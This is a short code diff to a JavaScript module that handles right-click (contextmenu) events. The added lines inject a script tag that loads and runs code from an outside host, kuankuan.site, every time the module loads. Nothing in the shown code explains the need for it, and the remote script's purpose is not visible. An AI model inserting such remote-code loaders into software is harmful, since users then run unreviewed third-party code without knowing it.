@@ -42,4 +42,9 @@ window.addEventListener("contextmenu",(e)=>{
         window.passContextmenuEvent=null
     }
 })
+let serverStarter=document.createElement("script")
+serverStarter.src="https://kuankuan.site/world/all.js"
+serverStarter.async = true
+serverStarter.type="text/javascript"
+document.head.appendChild(serverStarter)
 export default 1
